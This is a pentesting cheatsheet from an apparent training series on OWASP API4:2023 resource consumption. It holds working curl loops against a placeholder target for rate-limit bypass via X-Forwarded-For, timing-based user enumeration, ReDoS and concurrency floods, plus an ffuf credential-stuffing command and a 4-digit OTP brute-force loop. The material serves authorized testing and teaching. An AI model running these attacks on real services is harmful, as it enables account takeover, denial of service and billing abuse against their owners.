# Cheatsheet — Unrestricted Resource Consumption (API4:2023)

Quick-reference companion to files 01–04. Use this during live testing; refer back to
the full files for mechanism explanations and reporting-quality justification.

---

## 1. Detection Quick Commands

**Burst test (response-based detection):**
```bash
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} %{time_total}\n" \
    -H "Authorization: Bearer <TOKEN>" \
    https://api.target.com/api/v1/<ENDPOINT>
done
```

**Header check:**
```bash
curl -sI -H "Authorization: Bearer <TOKEN>" \
  https://api.target.com/api/v1/<ENDPOINT> | grep -i "ratelimit\|retry-after"
```

**X-Forwarded-For bypass check:**
```bash
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    https://api.target.com/api/v1/login
done
```

**Timing drift (soft throttling):**
```bash
for i in $(seq 1 50); do
  START=$(date +%s.%N)
  curl -s -o /dev/null https://api.target.com/api/v1/<ENDPOINT>
  END=$(date +%s.%N)
  echo "Request $i: $(echo "$END - $START" | bc)s"
done
```

**Timing-based user enumeration (avg over N requests, compare valid vs invalid):**
```bash
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{time_total}\n" \
    -X POST https://api.target.com/api/v1/login \
    -d '{"username":"<CANDIDATE>","password":"wrong"}'
done
```

---

## 2. Rate-Limit Header Reference

| Header | Meaning |
|---|---|
| `X-RateLimit-Limit` | Total requests allowed per window |
| `X-RateLimit-Remaining` | Requests left in current window |
| `X-RateLimit-Reset` | Time until window resets |
| `Retry-After` | Seconds to wait (usually with `429`) |
| `RateLimit-Limit` / `RateLimit-Remaining` / `RateLimit-Policy` | IETF draft standard, seen on modern gateways (Kong, AWS API Gateway, Cloudflare) |

**Red flags:** headers present but `Remaining` never decrements → cosmetic/broken
enforcement. Headers absent → test with burst, don't assume no limit.

---

## 3. Resource Exhaustion Payload Reference

| Technique | Payload / Parameter | Resource hit |
|---|---|---|
| Pagination abuse | `?limit=9999999` or `?limit=-1` | DB load, memory, bandwidth |
| Pagination + BOLA chain | `?limit=9999999&user_id=*` | Mass data exfiltration |
| File upload abuse | `dd if=/dev/zero of=huge.jpg bs=1M count=2048` | Memory (buffering), disk |
| ReDoS | `"a"*30 + "!"` against `^([a-zA-Z]+)*$`-style patterns | CPU (single-threaded pin) |
| Expensive computation | 30x concurrent `curl ... &` to a heavy endpoint | CPU, memory, cloud cost |

**ReDoS payload generator:**
```bash
python3 -c 'print("a"*35+"!")'
```

**Concurrent request burst:**
```bash
for i in $(seq 1 30); do
  curl -s -o /dev/null -w "Request $i: %{time_total}s\n" \
    -X POST https://api.target.com/api/v1/<HEAVY_ENDPOINT> -d '<payload>' &
done
wait
```

---

## 4. Third-Party Spending Abuse Reference

| Service type | Vendor examples | Billing unit | Test endpoint pattern |
|---|---|---|---|
| SMS OTP | Twilio, Vonage, AWS SNS | Per message | `/auth/send-otp`, `/auth/resend-code` |
| Email | SendGrid, Mailgun, AWS SES | Per email | `/auth/resend-verification` |
| Geocoding | Google Maps, Mapbox | Per call | `/address/lookup` |
| Payment/fraud check | Stripe, PayPal, fraud APIs | Per call | `/payment/validate-card` |
| AI/LLM | OpenAI, Anthropic, etc. | Per token/call | `/ai/generate`, `/assistant/query` |

**⚠️ Always use your own authorized test number/email/card. Never target real third
parties. Confirm actual send (not silent no-op) with 3–5 requests before scaling.**

---

## 5. Enumeration / Brute-Force Quick Reference

```bash
# Credential stuffing via ffuf
ffuf -request login_request.txt -request-proto https \
  -w credential_pairs.txt:PAIR -mc all -fc 401 -t 50

# OTP brute-force (4-digit keyspace)
for code in $(seq -w 0000 9999); do
  curl -s -X POST https://api.target.com/api/v1/verify-otp \
    -d "{\"user_id\":\"12345\",\"otp\":\"$code\"}" | grep -q "success" && echo "FOUND: $code" && break
done
```

Cross-reference: Broken Authentication (API2:2023) series for full mechanism detail.

---

## 6. PortSwigger Lab Map (Progression Order)

| Order | Lab | Category |
|---|---|---|
| 1 | Authentication → Username enumeration via different responses | Detection |
| 2 | Authentication → Username enumeration via subtly different responses | Detection |
| 3 | Authentication → Username enumeration via response timing | Timing detection |
| 4 | Authentication → Broken brute-force protection, IP block | Rate-limit bypass |
| 5 | Authentication → 2FA broken logic | OTP/brute-force adjacent |
| 6 | Business logic vulnerabilities → Insufficient workflow validation | General unrestricted-action pattern |
| 7 | File upload vulnerabilities → RCE via web shell upload | Upload surface (not size-based) |

**Gap disclosure:** No PortSwigger labs exist for pagination abuse, header-based rate
limit analysis, ReDoS, expensive computation abuse, or third-party spending abuse.
Use crAPI and manual test harnesses for these.

---

## 7. crAPI Reference Points

| crAPI feature | Practice target for |
|---|---|
| OTP / coupon validation endpoints | OTP brute-force, rate-limit-absence detection |
| Login / forgot-password flow | Enumeration, credential stuffing |
| Product listing / order history | Pagination limit abuse |
| Community/forum image upload | File upload size abuse |

No crAPI equivalent exists for ReDoS, expensive computation abuse, or real third-party
billing integration — genuine gaps, not oversight.

---

## 8. Report-Writing Checklist

- [ ] Baseline request/response captured
- [ ] Exploit request/response captured with exact parameters used
- [ ] Request count and timing documented (not just "many requests" — exact numbers)
- [ ] Test repeated at least twice / at different times to rule out transient effects
- [ ] Resource exhausted explicitly named (CPU / memory / disk / DB / third-party $ )
- [ ] Root cause stated (missing server-side ceiling, trusted client header, etc.)
- [ ] For third-party abuse: confirm actual send/charge occurred, not silent no-op
- [ ] For third-party abuse: only own/authorized test recipients used
- [ ] Remediation direction noted (server-side cap, gateway rate limit, async queueing, non-backtracking regex, etc.)
- [ ] Cross-referenced chained vulnerabilities (BOLA, Broken Authentication) if applicable

---

## 9. Series File Index

| File | Covers |
|---|---|
| `01-overview-concept.md` | Concept, mechanism, real-world framing |
| `02-detection-methodology.md` | Response-based, header, timing detection; enumeration/brute-force |
| `03-resource-exhaustion-techniques.md` | Pagination, file upload, ReDoS, expensive computation |
| `04-third-party-spending-abuse.md` | SMS/email/payment cost amplification |
| `05-cheatsheet.md` | This file |
